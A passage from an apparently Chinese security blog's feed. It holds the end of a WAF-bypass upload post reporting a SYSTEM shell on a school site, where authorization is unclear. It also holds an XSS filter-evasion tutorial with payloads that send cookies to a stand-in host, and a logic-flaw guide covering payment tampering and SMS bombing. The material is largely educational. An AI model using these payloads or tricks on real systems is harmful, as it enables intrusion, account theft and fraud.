<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342127.png" alt="图片"></p>
<p>成功getshell，System权限</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342128.jpeg" alt="图片"></p>
<p>看了一眼依赖，可能存在log4j2和jackson的RCE，留着下次当靶场继续测试</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342229.png" alt="图片"></p>
<h1 id="-4"><a href="#-4" class="headerlink" title=""></a></h1><h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a><strong>0x06 总结</strong></h1><p>深信服的waf算挺强了，而且也足够恶心，检测可疑行为直接封ip，光是fuzz就用掉了快30个ip了</p>
<p>学校其他站点有thinkphp5.0.23 RCE、泛微8.0前台sql注入的漏洞，但都有这个waf，实在没有耐心一个个fuzz</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
        <tag>WAF</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次较为详细的代码审计过程</title>
    <url>/posts/b9a97374.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://mp.weixin.qq.com/s/rcQCuov84Y_tIKcrXRi3XA">https://mp.weixin.qq.com/s/rcQCuov84Y_tIKcrXRi3XA</a></p>
<p>荐语：由自动化代码审计入门代码审计</p>
</blockquote>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次审计的话是Seay+昆仑镜进行漏洞扫描<br>Seay的话它可以很方便的查看各个文件，而昆仑镜可以很快且扫出更多的漏洞点，将这两者进行结合起来，就可以发挥更好的效果。<br>昆仑镜官方地址<br><a href="https://github.com/LoRexxar/Kunlun-M">https://github.com/LoRexxar/Kunlun-M</a></p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p><a href="https://mp.weixin.qq.com/s/rcQCuov84Y_tIKcrXRi3XA">https://mp.weixin.qq.com/s/rcQCuov84Y_tIKcrXRi3XA</a></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>跨站脚本攻击（XSS）</title>
    <url>/posts/ee6b817d.html</url>
    <content><![CDATA[<h3 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h3><h4 id="一、XSS介绍"><a href="#一、XSS介绍" class="headerlink" title="一、XSS介绍"></a>一、XSS介绍</h4><p>​		跨站脚本攻击，英文全称 <strong>Cross Site Script</strong> , 为了与 CSS 区分，取名 XSS。</p>
<p>​		XSS攻击，通常指攻击者通过 <strong>HTML注入</strong> 篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。如今的XSS并不局限于他的名字，是否跨域已经不重要了。</p>
<h4 id="二、XSS分类"><a href="#二、XSS分类" class="headerlink" title="二、XSS分类"></a>二、XSS分类</h4><h5 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1. 反射型XSS"></a>1. 反射型XSS</h5><p>​	反射型 XSS 把用户输入的数据 “反射“ 给浏览器。攻击者通常需要诱使用户 <strong>点击</strong> 一个恶意链接，才能攻击成功。反射型 XSS 也叫 <strong>非持久型XSS</strong>。</p>
<h5 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="2. 存储型XSS"></a>2. 存储型XSS</h5><p>​	存储型 XSS 会把用户输入的数据 <strong>存储</strong> 在服务器端，数据库没有过滤就保存，然后取出生成一个页面。</p>
<h5 id="3-DOM型XSS"><a href="#3-DOM型XSS" class="headerlink" title="3. DOM型XSS"></a>3. DOM型XSS</h5><p>​	通过修改页面的 <strong>DOM</strong> 节点形成的 XSS ，称之为 <strong>DOM Based XSS</strong>。通常是web应用的一段脚本可以从用户提交的URL中提取数据，并对数据进行处理，然后用它动态跟新页面的内容。和反射型XSS一样，也需要攻击者构造一个恶意链接，并诱使用户点击它。</p>
<h4 id="三、利用XSS并避开过滤"><a href="#三、利用XSS并避开过滤" class="headerlink" title="三、利用XSS并避开过滤"></a>三、利用XSS并避开过滤</h4><h5 id="1-避开基于签名的过滤"><a href="#1-避开基于签名的过滤" class="headerlink" title="1. 避开基于签名的过滤"></a>1. 避开基于签名的过滤</h5><ul>
<li>许多过滤匹配特殊的标签，包括起始和结束尖括号。但许多浏览器接受结束括号前的空白符，允许攻击者避开这种过滤。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script &gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>许多人用小写字符编写HTML代码，所以一些过滤仅检查常用的小写恶意标签。这种方式可以通过改变字符大小写避开过滤。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;SCriPt&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>一些过滤匹配任何成对的起始与结束尖括号，删除其中的任何内容。这时只能注入一个新标签，但通常还可以依靠周围的现有语法，结束注入的标签，从而避开这种过滤。例如：如果可以可以使用以下代码中的value属性值：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;pageid&quot; value=&quot;foo&quot;&gt;			</span><br></pre></td></tr></table></figure>

<p>那么就可以使用以下不会被过滤阻止的脚本，注入一个包含javascript的新标签：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foo&quot;&gt;&lt;x style=&quot;x:expression(alert(document.cookie))</span><br></pre></td></tr></table></figure>

<p>在许多情况下，浏览器接受未结束的HTML标签：攻击者可以利用这种行为避开过滤。</p>
<p>下面的代码属于无效的HTML代码，但其中注入的JavaScript仍然得以执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=alert(document.cookie)</span><br></pre></td></tr></table></figure>

<ul>
<li>一些过滤匹配成对的起始与结束尖括号，提取其中的内容，并将这些内容与标签名称黑名单进行比较。这是，如果可以通过使用多余的括号（为浏览器所接受）避开过滤。例如：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;&lt;script&gt;alert(document.cookie);//&lt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>即使空字节后面的文本仍然在应用程序的响应中返回，但如果遇到空字节，一些过滤会停止处理字符串。在被过滤的表达式前插入一个<strong>URL编码</strong>的空字节即可避开这种过滤。例如：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foo%00&lt;script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>在不同的目标浏览器中，通常可以在被过滤的表达式中插入能够避开过滤、但仍被浏览器接受的字符。例如：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script/src=...</span><br><span class="line">&lt;scr%00ipt&gt;</span><br><span class="line">expr/****/ession</span><br></pre></td></tr></table></figure>

<ul>
<li>如果用户提交的数据在应用过滤后还（进一步）进行了规范化，那么攻击者仍然可以通过URL编码或双重编码被过滤的表达式，避开过滤，并对漏洞加以利用。例如：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%3cscript%3e</span><br><span class="line">%253cscript%253e</span><br></pre></td></tr></table></figure>

<ul>
<li>由于在服务器执行所有输入确认后，在响应中返回的攻击有效载荷会被受害者的浏览器解码，这时就会出现一种避开常规规范化的特殊情况。在某些时候，攻击者可以对攻击有效载荷进行<strong>HTML编码</strong>以避开服务器的确认输入，受害者的浏览器将会再次解码有效载荷。例如，表达式：javascript：常被阻止以防止使用这种协议的攻击。但是，攻击者可以通过各种浏览器接受的方式对该表达式进行<strong>HTML编码</strong>。</li>
<li>有时可以成功执行一些JavaScript脚本，但对于在代码中可以使用哪些命令和关键字存在一些限制。在这种情况下，可以通过动态创建并执行语句来避开应用程序的过滤。例如，如果应用程序阻止用户提交的任何包含表达式document.cookie的数据，那么使用以下输入即可轻易避开这种过滤：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var a = &quot;alert(doc&quot; + &quot;ument.coo&quot; + &quot;kie)&quot;; eval(a);</span><br><span class="line">或者</span><br><span class="line">var a = &quot;alert(&quot; + String.fromCharCode(100,111,99,117,109,101,110,116,46,99,111,111,107,105,101) + &quot;)&quot;; eval(a);</span><br></pre></td></tr></table></figure>

<h5 id="2-避开净化"><a href="#2-避开净化" class="headerlink" title="2. 避开净化"></a>2. 避开净化</h5><ul>
<li>如果过滤完全删除某些表达式，并且至少有一个被删除的表达式长度超过一个字符，那么只要应用程序没有进行递归进化，就有可能避开过滤。例如：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>和前面描述的避开基于签名的过滤一样，也可以通过编码被过滤的表达式或在它们之前插入一个空字节，从而避开净化过滤。</li>
<li>如果在一段脚本中注入一个引用字符串，应用程序在注入的引号字符前插入反斜线字符。在这种情况下，应该确认反斜线字符本身是否被转义。如果其未被转义，那么这种过滤就可以避开。例如</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var a = &#x27;foo&#x27;;</span><br><span class="line">那么可以注入</span><br><span class="line">foo\&#x27;;alert(document.cookie);//</span><br><span class="line">结果如下</span><br><span class="line">var a = &#x27;foo\\&#x27;;alert(document.cookie);//&#x27;;</span><br></pre></td></tr></table></figure>

<ul>
<li>如果反斜线字符被正确转义，但尖括号却原样返回，那么攻击者可以构造如下攻击：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>这样做可废弃应用程序中原来的脚本，并在其后注入一段新的脚本，攻击之所以能够成功，是因为浏览器在解析植入的Javascript之前，优先解析HTML标签，导致引号无效了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;var a = &#x27;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>此时，虽然原来的脚本中包含一个错误，但这无关紧要；因为浏览器会跳过这个错误，继续执行注入的脚本。</p>
<ul>
<li>如果应用程序对单引号和双引号进行了转义，前面两个脚本也无法使用，但可以使用String.fromCharCode技巧，不用分隔字符创建字符串。</li>
</ul>
<h5 id="3-突破长度限制"><a href="#3-突破长度限制" class="headerlink" title="3. 突破长度限制"></a>3. 突破长度限制</h5><p>当应用程序把输入截断为一个固定的最大长度时，有三种建立攻击字符串的方法。</p>
<ul>
<li>第一种是尝试使用最短可能长度的JavaScriptAPI，删除哪些通常包含在内但并不完全必要的字符，缩短攻击有效载荷。例如，如果注入现有的一段代码，下面的28字节命令将把用户的cookie传送至主机名为a：的服务器。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open(&quot;//a/&quot;+document.cookie)</span><br></pre></td></tr></table></figure>

<p>​		另外，如果直接注入HTML，那么下面这个30字节的标签将从主机名为a：的服务器加载并执行一段脚本。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=http://a&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>第二种更加强大的突破长度限制的技巧是将一个攻击有效载荷分布到几个不同的位置，用户控制的输入在这里插入到同一个返回页面中。以下面的URL为例：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://wahh-app.com/account.php?page_id=244&amp;&amp;seed=1234&amp;mode=normal</span><br></pre></td></tr></table></figure>

<p>​		它将返回一个包含以下内容的页面：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;page_id&quot; value=&quot;244&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;seed&quot; value=&quot;1234&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;mode&quot; value=&quot;normal&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>​		假设应用程序对每个字段实施了长度限制，以阻止在其中插入有效的攻击字符串。但攻击者仍然可以使用以下URL将一段脚本分布到他所控制的三个位置，从而传送一个有效的攻击字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://wahh-app.com/account.php?page_id=&quot;&gt;&lt;script&gt;/*&amp;seed=*/alert(document.cookie);/*&amp;mode=*/&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>​		这个URL参数被植入到页面中后，生成如下脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;page_id&quot; value=&quot;&quot;&gt;&lt;script&gt;/*&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;seed&quot; value=&quot;*/alert(document.cookie);/*&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;mode&quot; value=&quot;*/&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>​		最终得到的HTML完全有效，等同于加粗显示的部分。其中的源代码块已成为JavaScript注释（包含在&#x2F;*与 *&#x2F;之间），因此被浏览器忽略。这样，注入的脚本被执行。</p>
<ul>
<li>第三种技巧是，将一个反射型XSS漏洞 “转换” 成一个基于DOM的漏洞。例如，在最初的反射型XSS漏洞中，如果应用程序对复制到返回页面中的message参数设置长度限制，那么就可以注入以下46字节的脚本，它对当前URL中的片段字符串求值。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;eval(location.hash.substr(1))&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>​		通过在易于受到反射型XSS攻击的参数中注入这段脚本，可以在生成的页面中造成一个基于DOM的XSS漏洞，从而执行位于片断字符串中的另一段脚本，它不受应用程序过滤的影响，可为任意长度。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://baidu.com/errror.php?message=&lt;script&gt;eval(location.hash.substr(1))&lt;/script&gt;#alert(&#x27;long script here ......&#x27;)</span><br></pre></td></tr></table></figure>

<h5 id="4-修改请求方法"><a href="#4-修改请求方法" class="headerlink" title="4. 修改请求方法"></a>4. 修改请求方法</h5><p>​	许多应用程序接受post和get的请求，尝试将post转为get，或将get转为post。可以使用Burp Proxy的 ”Change Request Method”操作来完成。</p>
<p>​	有时，把使用GET方法的攻击转换成使用POST方法的攻击允许避开某些过滤。如果一个应用程序希望受到GET方法的请求，它可能只对URL查询字符串执行这种过滤。</p>
<h5 id="5-使用非标准内容编码"><a href="#5-使用非标准内容编码" class="headerlink" title="5. 使用非标准内容编码"></a>5. 使用非标准内容编码</h5><p>​	前提：允许直接设置通过应用程序响应指定的编码类型。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type:text/html; charset=ISO-8859-1</span><br></pre></td></tr></table></figure>

<p>如使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">utf-7</span><br><span class="line">US-ASCII</span><br><span class="line">UTF-16</span><br></pre></td></tr></table></figure>



<h4 id="四、防止XSS攻击"><a href="#四、防止XSS攻击" class="headerlink" title="四、防止XSS攻击"></a>四、防止XSS攻击</h4><h5 id="1-防止反射型与保存型XSS漏洞"><a href="#1-防止反射型与保存型XSS漏洞" class="headerlink" title="1. 防止反射型与保存型XSS漏洞"></a>1. 防止反射型与保存型XSS漏洞</h5><p>​	用户可控制的数据未经适当确认与净化就被复制到应用程序响应中，这是造成反射型与存储型XSS漏洞的根本原因。</p>
<p>​	确定所有可能存在XSS风险，需要适当进行防御的操作后，需要采取一种三重防御方法阻止漏洞的发生。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">确认输入</span><br><span class="line">确认输出</span><br><span class="line">消除危险的插入点</span><br></pre></td></tr></table></figure>

<ul>
<li><p>确认输入</p>
<p>如果应用程序在某个位置收到的用户提交的数据将来有可能被复制到它的响应中，应用程序应根据这种情形对这些数据执行尽可能严格的确认。需要确认的数据的潜在特性包括以下几点。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据不是太长</span><br><span class="line">数据仅包含某组合法字符</span><br><span class="line">数据与一个特殊的正则表达式相匹配</span><br></pre></td></tr></table></figure>

<p>根据应用程序希望在每个字段中收到的数据类型，应尽可能限制性地对姓名、电子邮件地址、账号等应用不同的确认规则。</p>
</li>
<li><p>确认输出</p>
</li>
</ul>
<p>如果应用程序将某位用户或第三方提交的数据复制到它的响应中，那么应用程序应对这些数据进行HTML编码，以净化可能的恶意字符。HTML编码指用对应的HTML实体替代字面量字符。这样做可确保浏览器安全处理可能为恶意的字符，把它们当作HTML文档的内容而非结构处理。一些经常造成问题的字符的HTML编码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;			&amp;quot;</span><br><span class="line">&#x27;			&amp;apos;</span><br><span class="line">&amp;			&amp;amp;</span><br><span class="line">&lt;			&amp;lt;</span><br><span class="line">&gt;			&amp;gt;</span><br></pre></td></tr></table></figure>

<p>除这些常用的编码外，实际上，任何字符都可以用它的数字ASCII字符代码进行HTML编码，举例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%		&amp;#37;</span><br><span class="line">*		&amp;#42;</span><br></pre></td></tr></table></figure>

<p>在将用户可控制的字符串复制到服务器的响应中之前，ASP应用程序可以使用 Server.HTMLEncode API净化其中的常见恶意字符。这个API把字符 ”&amp;&lt;和&gt;转换为它们对应的HTML实体，并且使用数字形式的编码转换任何大于0x7f（127）的ASCII字符。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/imgs/image-20210423120059847.png" alt="image-20210423120059847"></p>
<ul>
<li>消除危险注入点</li>
</ul>
<p>如果一个位置上有JavaScript命令直接出现，应该禁止在这里插入用户输入。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;userdata&quot;</span><br><span class="line">&lt;img src=&quot;foo.gif&quot; onload=&quot;userdata&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;username&quot; onfocus=&quot;userdata&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>在这种情况下，攻击者可以直接在引用字符串中注入JavaScript命令。而且，这是通过HTML编码用户数据进行防御也不会生效，因为一些浏览器在处理引用字符串的内容之前，会对它进行HTML解码。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;javascript&amp;#58;alert(document.cookie)&quot;&gt;</span><br><span class="line">&lt;img src=&quot;foo.gif&quot; onload=&quot;alert(&amp;apos;xss&amp;apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>





























]]></content>
      <tags>
        <tag>基础漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>记第一次机房渗透测试&amp;复盘</title>
    <url>/posts/c903e70a.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>实习的第三周，就接到去现场执行漏洞扫描和漏洞挖掘任务，这是我第一次外出现场，我的内心无疑是兴奋的，已经准备好大展拳脚了，拳打xss，脚踢sqli，积累项目经验，成为带黑阔，走上人生巅峰。</p>
<p>开始是美好和憧憬的，过程是曲折但有趣的，结果是还行的。</p>
<p>所以总结复盘了这次机房渗透测试之旅，希望能帮到和我一样的萌新。</p>
<h2 id="曲折"><a href="#曲折" class="headerlink" title="曲折"></a>曲折</h2><p>任务时间两天，这次的渗透测试任务很简单，到达客户的机房，连上网线，打开公司的漏洞扫描工具，设置好扫描任务，直接开扫，在扫描的时候手工对客户的内网应用系统进行渗透测试和漏洞复测，完事收工走人。</p>
<p>听起来是不是很简单，但过程十分的曲折。</p>
<ol>
<li>现在大部分的笔记本电脑都是不带网线插口的，我的也不例外</li>
<li>其他公司的人带了网线和网线转接口(<strong>typec转接口</strong>)，所以电脑无法同时连网线和充电</li>
<li>机房很冷这是真的，噪音很大也是真的，机房里没有桌子</li>
</ol>
<p>基于以上几点原因，第一天几乎是无功而返，手工测试做不了，因为漏扫的优先级比手工高，需要一会漏扫一会充电，轮着来。幸庆的是漏扫扫了一半了，不然明天真完成不了任务。</p>
<p>当天晚上回去立马在某东买了网线和网线转接口(<strong>USB转接口</strong>)，一个钟头就到了。</p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>机房很冷，风很大，噪音很大，坐的也不舒服，<del>但是没用</del>，还是影响很大的。</p>
<p>差不多只有五个小时的来进行渗透，目标的应用资产有十个，也就是说半个小时要完成一个站点的渗透，在如此陌生的环境下来说，还是有点难度的。</p>
<p>第一次接触这种情况，被打了个措手不及，刚开始浪费了一点时间，但好在后来找到了感觉，也算是挖到了几个新增漏洞和基本的漏洞复测，勉强能够交差<strong>😁</strong>。</p>
<p>挖的洞没什么技术含量，有手就行，因为这个客户的系统已经被我的同事进行过几次渗透测试了，能挖到新增漏洞就算成功。</p>
<p>总的来说，挖洞过程中没有做到最好，有很多不足，后面复盘的时候讲。</p>
<h2 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h2><ol>
<li>备好网线和网线转接口(如果你的电脑没有网线插口)、充电宝(机房里只有一个插座)、充电器、蓝牙耳机等等</li>
<li>外出现场记得备好一件外套和保温杯，你永远不会知道你会在什么极端条件下办公</li>
<li>机房里面不允许喝水这是常识。</li>
<li>多看一下同事上次留下的漏洞报告，总结一下这个系统哪种类型的漏洞最多，如果出现新的业务，不出意外你也能挖到新增漏洞。(系统是外包的，不用担心上次修复的漏洞，这次就不会出现。)</li>
<li>备好xray，因为内网也有waf，大流量的漏洞扫描器比如goby等用不了，所以十分适合xray的被动扫描模式，流量小，挖洞事半功倍。</li>
<li>备好各种渗透工具和密码字典，不然光是下载就要浪费很多时间。</li>
<li>文件上传的马记得删除干净，不然直接寄，前辈告诉我的。</li>
<li>身体健康还是很重要的，隔一段时间就要出去外面，如果你不想被冻傻和落下一身病来的话。</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这两天的工作就像黑客电影《我是谁：没有绝对安全的系统》里的那样，通过门禁，输入密码进入机房，亲身体验了一边这个流程，很酷的一件事情，不同的是他们是非法入侵，我是合法进入，也深刻的体会到要通过重重困难进入机房，拿到最高权限，绝非一件易事。</p>
<p>加油吧💪</p>
]]></content>
      <categories>
        <category>实习系列</category>
      </categories>
      <tags>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>逻辑漏洞总结</title>
    <url>/posts/4abdabd1.html</url>
    <content><![CDATA[<h1 id="逻辑漏洞总结"><a href="#逻辑漏洞总结" class="headerlink" title="逻辑漏洞总结"></a>逻辑漏洞总结</h1><h2 id="0x00-漏洞介绍"><a href="#0x00-漏洞介绍" class="headerlink" title="0x00 漏洞介绍"></a>0x00 漏洞介绍</h2><p>业务逻辑漏洞是指由于程序逻辑不严谨或逻辑太复杂，导致一些逻辑分支不能正常处理或处理错误。</p>
<h2 id="0x01-常见场景"><a href="#0x01-常见场景" class="headerlink" title="0x01 常见场景"></a>0x01 常见场景</h2><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/逻辑漏洞总结/逻辑漏洞-1624702448274.png" alt="逻辑漏洞"  />

<h2 id="0x02-漏洞场景"><a href="#0x02-漏洞场景" class="headerlink" title="0x02 漏洞场景"></a>0x02 漏洞场景</h2><h3 id="1-验证码爆破"><a href="#1-验证码爆破" class="headerlink" title="1. 验证码爆破"></a>1. 验证码爆破</h3><p>有些系统，手机获取验证码的时候，没有对验证码的验证次数进行限制，或者是没有对验证码的有限时间进行限制，就会造成验证码爆破。</p>
<p>四位验证码十分钟之内可以轻松爆破，六位建议放弃。</p>
<h3 id="2-凭证返回"><a href="#2-凭证返回" class="headerlink" title="2. 凭证返回"></a>2. 凭证返回</h3><p>凭证返回即，手机号码登录某系统，抓包，返回的相应包的set-Cookie字段或其他字段里面直接返回了验证码，我们可以直接输入该验证码，成功登录绕过。</p>
<h3 id="3-验证绕过"><a href="#3-验证绕过" class="headerlink" title="3. 验证绕过"></a>3. 验证绕过</h3><p><strong>这招之前没想到，很实用</strong></p>
<p>不只是验证码，在某些密码找回，或者验证用户凭证的时候，会根据返回的状态码进行校验，假设验证码是正确的，返回的状态码位200，错为500，这里我们就可以通过抓取响应包，修改状态码为200，即可达到验证绕过。</p>
<p><strong>又学会了一招——抓响应包</strong></p>
<p>抓响应包：在Burp里面的Do intercept -&gt; Response to this request。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20210626185929342.png" alt="image-20210626185929342"></p>
<h3 id="4-短信轰炸"><a href="#4-短信轰炸" class="headerlink" title="4. 短信轰炸"></a>4. 短信轰炸</h3><p>不多比比，直接上burp。</p>
<h3 id="5-session覆盖"><a href="#5-session覆盖" class="headerlink" title="5. session覆盖"></a>5. session覆盖</h3><p><strong>也是没想过的一招，很厉害的一个思路</strong></p>
<p>同一浏览器，打开两个密码找回页面，第一个页面输入自己的账户进行邮箱密码找回，进入自己的邮箱查看密码找回链接。接着第二个页面输入他人账户，进行密码找回，返回自己的邮箱点击链接，由于 session 覆盖导致了，这个链接成为了修改他人密码的链接，成功修改他人密码。</p>
<p>不仅是密码找回可以用，登录也可以覆盖。同一个浏览器打开两个页面登录两个用户，第二个用户会覆盖第一个用户，由于同一个浏览器一般公用session，所以第二次登录的时候把第一次的sessionid覆盖掉了，不过没什么威胁性就是了。</p>
<h3 id="6-逻辑越权"><a href="#6-逻辑越权" class="headerlink" title="6. 逻辑越权"></a>6. 逻辑越权</h3><p>分为水平越权和垂直越权（未授权访问的话应该也属于垂直越权吧，应该吧），越权漏洞很常见，20年的时候，淘宝仍然存在越权漏洞，被黑产利用，获取了很多信息。所以，每当大公司存在越权漏洞，伴随着的都是大量的信息泄露。</p>
<p><strong>逻辑越权一般都有一个关键的数字参数，遇到了就修改一下吧</strong></p>
<p><strong>每个页面都可以抓包试一下</strong></p>
<p>1.订单越权：通过修改URL的订单id值越权查看订单（有些是在POST包中修改）</p>
<p>2.收获地址越权：收货地址这里碰到的还是蛮多的，在收货地址的地方，查看收货地址，有些通过修改address的id值即可查看别人的收货地址，还有越权修改别人的收货地址，这里有一个小套路，假设此站点的收货地址存在xss漏洞，就可以通过修改别人的收货地址打到cookie，这里也算是个组合拳吧。还有就是思路需要灵活，有些开发对会员中心的收货地址进行限制了，但是在提交订单的地方，也是可以越权查看他人的收货地址的。</p>
<p>3.资料修改：这里跟收货地址其实没什么区别，也可以通过xss进行组合拳。</p>
<p>4.其实还有很多越权的方式，丰富的渗透大师都是自己总结的。</p>
<h3 id="7-换绑手机，密码重置"><a href="#7-换绑手机，密码重置" class="headerlink" title="7. 换绑手机，密码重置"></a>7. 换绑手机，密码重置</h3><p><strong>又是一个没有想过的小技巧，主要是没有环境来练手就没想到</strong></p>
<p>这种漏洞是后台没有对账户和绑定手机号进行检验</p>
<p>我们可以通过抓包修改绑定的手机号码为我们的手机号，即可造成密码重置，或者一些别的操作。</p>
<h3 id="8-支付类逻辑"><a href="#8-支付类逻辑" class="headerlink" title="8. 支付类逻辑"></a>8. 支付类逻辑</h3><p><strong>一句话，哪里有钱搞哪里</strong></p>
<p>1.商品价格修改：在购买商品的时候，通过抓包通过修改商品的价格，可以尝试修改为负数，让他给你退钱。这里修改商品价格的地方很多，加入购物车的时候可以修改，提交订单的时候也可以修改，这个看情况进行修改。</p>
<p>2.商品数量修改：有些开发会对商品的价格进行封装，我们通过修改数据包没法进行修改，但是这里的商品数量可以改为-1，然后我们再选择别的商品，即可造成价格抵扣。这里修改的地方也是加入购物车的时候可以修改，提交订单的时候也可以修改。</p>
<p>3.运费修改：这个跟以上同理，但是有些开发只对商品做了限制，忽略了运费这一点，通过修改运费为负数，即可抵扣商品。</p>
<p>4.支付金额修改：这个就是最后一步支付的时候，可以修改订单的价格，造成低价购买。</p>
<p><strong>如果价格那些参数值都被加密了，还可以拿别的商品的价格（比原商品低），覆盖原有商品的价格。</strong></p>
